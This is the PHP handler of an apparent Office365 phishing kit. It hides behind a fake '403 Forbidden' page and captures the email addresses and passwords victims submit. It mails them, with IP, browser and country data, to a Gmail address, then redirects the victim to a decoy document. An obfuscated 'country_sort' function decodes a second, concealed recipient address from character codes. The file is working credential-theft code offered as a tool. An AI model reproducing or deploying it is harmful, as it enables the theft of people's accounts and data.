<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

function random_number(){
	$numbers=array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key=array_rand($numbers);
	return $numbers[$key]; }

$url=random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
header('location:'.$url);


$country = visitor_country();
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$email = $_POST['email'];
$password = $_POST['password'];
$passchk = strlen($password);

$message .= "---------+ Office365 Login  |+-------\n";
$message .= "Email : ".$email."\n";
$message .= "Password : ".$password."\n";
$message .= "-----------------------------------\n";
$message .= "Client IP: ".$ip."\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "--+ Created BY Mr-Anobs in 2016 (skype:ethan-miles) +---\n";

$send = "tammiesippey691@gmail.com";
$subject = "Office365 | $country | $email";
$headers .= "MIME-Version: 1.0\n";
$headers .= $_POST['eMailAdd']."\n";
$headers = "From: John De Fisher <tee@ttcpanel.com>\n";

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

if ($passchk<6)
{
$passerr=0;
}
else
{
$passerr=1;
}

if ($passerr==0)
{
header("Location: Login2.php?$url&email=$email");
}
else
{
mail("$send", "$subject", $message, $headers);  
header("Location: http://docdro.id/3vUbWGr");
 
}


?>
